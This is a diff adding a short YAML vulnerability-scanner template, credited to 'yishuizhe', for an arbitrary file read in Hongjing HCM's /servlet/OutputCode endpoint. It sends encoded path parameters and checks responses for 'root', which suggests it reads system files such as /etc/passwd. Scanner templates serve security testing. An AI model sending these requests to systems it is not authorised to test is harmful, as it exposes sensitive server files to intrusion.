@@ -1,0 +1,21 @@
+```
+name: hongjing-hcm-openFile-file-read
+group:
+  - method: GET
+    path: "/servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B"
+    headers:
+      User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root")
+  - method: GET
+    path: "/servlet/OutputCode?path=RNcrjWtNfJnkUMbX1UB6VAPAATTP3HJDPAATTPPAATTP3HJDPAATTP"
+    headers:
+      User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root")
+detail:
+  author: yishuizhe
+  name: OutputCode File Read in Hongjing HCM
+```
